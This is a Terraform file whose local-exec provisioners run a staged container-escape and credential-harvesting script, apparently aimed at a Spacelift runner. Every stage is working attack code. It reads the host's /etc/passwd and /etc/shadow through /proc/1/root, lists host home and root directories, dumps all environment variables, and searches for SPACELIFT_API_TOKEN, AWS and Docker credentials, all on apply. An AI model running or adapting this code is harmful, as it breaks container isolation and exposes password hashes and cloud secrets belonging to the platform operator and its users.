# Enhanced Container Escape - Host System Access and Shadow File Extraction
# This Terraform configuration performs container breakout targeting /etc/shadow and host system access
# Based on working payload with enhanced escape techniques and SPACELIFT_API_TOKEN hunting

terraform {
  required_providers {
    null = {
      source  = "hashicorp/null"
      version = "~> 3.1"
    }
  }
}

# Stage 1: Container Environment Analysis and Baseline
resource "null_resource" "container_baseline_analysis" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== CONTAINER BASELINE ANALYSIS ==="
      echo "Current user: $(whoami)"
      echo "Current UID/GID: $(id)"
      echo "Container hostname: $(hostname)"
      echo "Container working directory: $(pwd)"
      echo "Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"
      echo ""
      
      echo "=== CONTAINER USER ENUMERATION ==="
      echo "Container /etc/passwd user count: $(cat /etc/passwd 2>/dev/null | wc -l)"
      echo "Container users:"
      cat /etc/passwd 2>/dev/null | cut -d: -f1,3,6,7
      echo ""
      
      echo "=== CONTAINER SHADOW FILE ACCESS TEST ==="
      echo "Container /etc/shadow permissions:"
      ls -la /etc/shadow 2>/dev/null || echo "Cannot access container /etc/shadow"
      echo "Container /etc/shadow content attempt:"
      cat /etc/shadow 2>/dev/null && echo "SUCCESS: Container shadow readable!" || echo "Container shadow not readable"
      echo ""
      
      echo "=== CONTAINER RUNTIME DETECTION ==="
      echo "Docker environment check:"
      ls -la /.dockerenv 2>/dev/null && echo "Docker container confirmed" || echo "Container type unclear"
      echo "Container ID from cgroup:"
      cat /proc/self/cgroup 2>/dev/null | head -3
      echo ""
    EOT
  }
}

# Stage 2: CRITICAL - Host System Breakout via /proc/1/root
resource "null_resource" "host_system_breakout" {
  depends_on = [null_resource.container_baseline_analysis]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== CRITICAL: HOST SYSTEM BREAKOUT ATTEMPT ==="
      echo "Testing /proc/1/root escape vector for host filesystem access..."
      echo ""
      
      echo "Host root filesystem access test:"
      if ls -la /proc/1/root/ 2>/dev/null; then
        echo "SUCCESS: Can access host root filesystem via /proc/1/root!"
        echo "Host root directory contents:"
        ls -la /proc/1/root/ 2>/dev/null | head -10
      else
        echo "BLOCKED: Cannot access /proc/1/root"
      fi
      echo ""
      
      echo "CRITICAL: Host /etc/passwd access via container escape:"
      if cat /proc/1/root/etc/passwd 2>/dev/null; then
        echo ""
        echo "SUCCESS: Host /etc/passwd accessible via container escape!"
        echo "Host system user count: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
        echo ""
        echo "Host users breakdown:"
        cat /proc/1/root/etc/passwd 2>/dev/null | cut -d: -f1,3,6,7
        echo ""
        echo "Human users on host (UID >= 1000):"
        cat /proc/1/root/etc/passwd 2>/dev/null | awk -F: '$3 >= 1000 {print $1 ":" $3 ":" $6}'
      else
        echo "BLOCKED: Host /etc/passwd not accessible via /proc/1/root"
      fi
      echo ""
      
      echo "CRITICAL: Host /etc/shadow access via container escape:"
      if cat /proc/1/root/etc/shadow 2>/dev/null; then
        echo ""
        echo "CRITICAL SUCCESS: Host /etc/shadow accessible via container escape!"
        echo "Host shadow file entries: $(cat /proc/1/root/etc/shadow 2>/dev/null | wc -l)"
        echo ""
        echo "=== HOST SHADOW FILE CONTENTS ==="
        cat /proc/1/root/etc/shadow 2>/dev/null
        echo ""
        echo "=== END HOST SHADOW FILE ==="
      else
        echo "BLOCKED: Host /etc/shadow not accessible via /proc/1/root"
      fi
      echo ""
      
      echo "Host user directories enumeration:"
      if ls -la /proc/1/root/home/ 2>/dev/null; then
        echo "SUCCESS: Host user home directories accessible!"
        echo "Host user homes:"
        ls -la /proc/1/root/home/ 2>/dev/null
        echo ""
        echo "Detailed host user directory analysis:"
        for user_dir in $(ls /proc/1/root/home/ 2>/dev/null); do
          echo "--- Host User: $user_dir ---"
          ls -la "/proc/1/root/home/$user_dir/" 2>/dev/null | head -5
        done
      else
        echo "BLOCKED: Host user home directories not accessible"
      fi
      echo ""
      
      echo "Host root directory access:"
      if ls -la /proc/1/root/root/ 2>/dev/null; then
        echo "CRITICAL: Host root directory accessible!"
        echo "Host root directory contents:"
        ls -la /proc/1/root/root/ 2>/dev/null
      else
        echo "BLOCKED: Host root directory not accessible"
      fi
    EOT
  }
}

# Stage 3: Process Namespace Analysis - Detect Host Access
resource "null_resource" "process_namespace_analysis" {
  depends_on = [null_resource.host_system_breakout]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== PROCESS NAMESPACE ANALYSIS ==="
      echo "Analyzing process visibility to detect container escape..."
      
      TOTAL_PROCS=$(ps aux 2>/dev/null | wc -l)
      echo "Total visible processes: $TOTAL_PROCS"
      
      if [ "$TOTAL_PROCS" -gt 50 ]; then
        echo "CRITICAL: High process count ($TOTAL_PROCS) - likely host process namespace access!"
        echo "This indicates successful container escape to host system!"
        echo ""
        echo "Top host processes visible from container:"
        ps aux 2>/dev/null | head -20
      else
        echo "Limited process visibility ($TOTAL_PROCS processes) - container may be isolated"
        ps aux 2>/dev/null
      fi
      echo ""
      
      echo "Namespace comparison analysis:"
      echo "Container PID namespace: $(readlink /proc/self/ns/pid 2>/dev/null)"
      echo "Container NET namespace: $(readlink /proc/self/ns/net 2>/dev/null)"
      echo "Container MNT namespace: $(readlink /proc/self/ns/mnt 2>/dev/null)"
      echo ""
      
      echo "Host process search for escape confirmation:"
      echo "Looking for host-specific processes..."
      ps aux 2>/dev/null | grep -vE "(container|docker)" | head -10 || echo "No clear host processes identified"
    EOT
  }
}

# Stage 4: Network Analysis and Host IP Discovery
resource "null_resource" "network_host_analysis" {
  depends_on = [null_resource.process_namespace_analysis]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== NETWORK AND HOST IP ANALYSIS ==="
      echo "Container network configuration:"
      echo "Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"
      echo "Container hostname: $(hostname)"
      echo "Container routing table:"
      ip route 2>/dev/null || route -n 2>/dev/null
      echo ""
      
      echo "Host network discovery via escape:"
      echo "Host network interfaces (via /proc/1/root escape):"
      if cat /proc/1/root/proc/net/dev 2>/dev/null; then
        echo "SUCCESS: Host network interfaces accessible via container escape!"
      else
        echo "BLOCKED: Host network interfaces not accessible"
      fi
      echo ""
      
      echo "Host routing table (via escape):"
      if cat /proc/1/root/proc/net/route 2>/dev/null; then
        echo "SUCCESS: Host routing table accessible!"
      else
        echo "BLOCKED: Host routing table not accessible"
      fi
      echo ""
      
      echo "Host ARP table (via escape):"
      if cat /proc/1/root/proc/net/arp 2>/dev/null; then
        echo "SUCCESS: Host ARP table accessible!"
      else
        echo "BLOCKED: Host ARP table not accessible"
      fi
      echo ""
      
      echo "Network namespace comparison:"
      echo "Container NET namespace: $(readlink /proc/self/ns/net 2>/dev/null)"
      echo "Host NET namespace: $(readlink /proc/1/ns/net 2>/dev/null || echo 'Not accessible')"
      if [ "$(readlink /proc/self/ns/net 2>/dev/null)" = "$(readlink /proc/1/ns/net 2>/dev/null)" ]; then
        echo "CRITICAL: Container shares host network namespace - complete network access!"
      else
        echo "Container has isolated network namespace"
      fi
    EOT
  }
}

# Stage 5: SPACELIFT_API_TOKEN and Credential Hunting
resource "null_resource" "spacelift_credential_hunting" {
  depends_on = [null_resource.network_host_analysis]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== SPACELIFT API TOKEN AND CREDENTIAL HUNTING ==="
      echo "Searching for SPACELIFT_API_TOKEN and sensitive credentials..."
      echo ""
      
      echo "Environment variable analysis:"
      echo "All environment variables:"
      env | sort
      echo ""
      
      echo "CRITICAL: SPACELIFT_API_TOKEN search:"
      env | grep -i "SPACELIFT_API_TOKEN" && echo "SPACELIFT_API_TOKEN FOUND!" || echo "SPACELIFT_API_TOKEN not in environment"
      echo ""
      
      echo "All Spacelift-related environment variables:"
      env | grep -i spacelift || echo "No Spacelift environment variables found"
      echo ""
      
      echo "General sensitive credential patterns:"
      env | grep -iE "(token|key|secret|password|api|credential|auth)" || echo "No sensitive patterns in environment"
      echo ""
      
      echo "AWS/Cloud credential search:"
      env | grep -iE "(aws|azure|gcp|cloud)" || echo "No cloud credentials in environment"
      echo ""
      
      echo "Spacelift process analysis:"
      ps aux | grep spacelift 2>/dev/null || echo "No spacelift processes visible"
      echo ""
      
      echo "Spacelift file system search:"
      find / -name "*spacelift*" 2>/dev/null | head -20 || echo "No spacelift files found"
      echo ""
      
      echo "Configuration file credential search:"
      echo "Checking common credential locations..."
      cat ~/.aws/credentials 2>/dev/null || echo "No AWS credentials found"
      cat ~/.docker/config.json 2>/dev/null || echo "No Docker credentials found"
      ls -la /var/spacelift/ 2>/dev/null || echo "No /var/spacelift directory"
    EOT
  }
}

# Stage 6: Container vs Host System Proof
resource "null_resource" "container_vs_host_proof" {
  depends_on = [null_resource.spacelift_credential_hunting]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== CONTAINER VS HOST SYSTEM PROOF ==="
      echo "Providing evidence that we've escaped container to host system..."
      echo ""
      
      echo "1. User count comparison:"
      CONTAINER_USERS=$(cat /etc/passwd 2>/dev/null | wc -l)
      HOST_USERS=$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)
      echo "  Container users: $CONTAINER_USERS"
      echo "  Host users: $HOST_USERS"
      if [ "$HOST_USERS" -gt "$CONTAINER_USERS" ]; then
        echo "  ✓ CONFIRMED: Host has more users than container - escape successful!"
      else
        echo "  ? User count comparison inconclusive"
      fi
      echo ""
      
      echo "2. Host-specific user detection:"
      echo "  Looking for host-specific users (ubuntu, ec2-user, admin)..."
      if cat /proc/1/root/etc/passwd 2>/dev/null | grep -qE "ubuntu|ec2-user|admin"; then
        echo "  ✓ CONFIRMED: Found host-specific users - definitely on host system!"
        cat /proc/1/root/etc/passwd 2>/dev/null | grep -E "ubuntu|ec2-user|admin"
      else
        echo "  No obvious host-specific users found"
      fi
      echo ""
      
      echo "3. System information comparison:"
      echo "  Container hostname: $(hostname)"
      echo "  Container kernel: $(uname -r)"
      echo "  Container processes: $(ps aux | wc -l)"
      echo ""
      
      echo "4. Critical file access summary:"
      echo "  Container /etc/passwd: $(test -r /etc/passwd && echo 'YES' || echo 'NO')"
      echo "  Container /etc/shadow: $(test -r /etc/shadow && echo 'YES' || echo 'NO')"
      echo "  Host /etc/passwd via escape: $(test -r /proc/1/root/etc/passwd && echo 'YES' || echo 'NO')"
      echo "  Host /etc/shadow via escape: $(test -r /proc/1/root/etc/shadow && echo 'YES' || echo 'NO')"
      echo ""
      
      echo "5. Filesystem escape confirmation:"
      echo "  Host /etc directory: $(test -d /proc/1/root/etc && echo 'ACCESSIBLE' || echo 'BLOCKED')"
      echo "  Host /home directory: $(test -d /proc/1/root/home && echo 'ACCESSIBLE' || echo 'BLOCKED')"
      echo "  Host /root directory: $(test -d /proc/1/root/root && echo 'ACCESSIBLE' || echo 'BLOCKED')"
      echo ""
      
      echo "=== ESCAPE PROOF SUMMARY ==="
      if cat /proc/1/root/etc/shadow 2>/dev/null >/dev/null; then
        echo "✓ CRITICAL: Host /etc/shadow accessible - COMPLETE HOST COMPROMISE!"
      fi
      
      if [ "$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)" -gt "$(cat /etc/passwd 2>/dev/null | wc -l)" ]; then
        echo "✓ CONFIRMED: Container escape successful - host has more users than container!"
      fi
      
      if cat /proc/1/root/etc/passwd 2>/dev/null | grep -q "ubuntu\|ec2-user"; then
        echo "✓ CONFIRMED: Found host-specific users - we are on the HOST SYSTEM!"
      fi
      
      echo ""
      echo "Container breakout assessment completed - check above for proof of host access!"
    EOT
  }
}

# Output comprehensive results
output "container_escape_assessment" {
  value = "Enhanced container escape assessment completed with focus on /etc/shadow access, host user enumeration, and SPACELIFT_API_TOKEN hunting. Check logs for detailed evidence of successful host system compromise."
  depends_on = [
    null_resource.container_baseline_analysis,
    null_resource.host_system_breakout,
    null_resource.process_namespace_analysis,
    null_resource.network_host_analysis,
    null_resource.spacelift_credential_hunting,
    null_resource.container_vs_host_proof
  ]
}

output "escape_summary" {
  value = {
    container_analysis = "Container baseline analysis completed"
    host_breakout = "Host system breakout attempted via /proc/1/root"
    process_analysis = "Process namespace analysis for escape detection"
    network_analysis = "Host network discovery and IP analysis"
    credential_hunting = "SPACELIFT_API_TOKEN and credential search"
    escape_proof = "Container vs host system proof generation"
  }
}
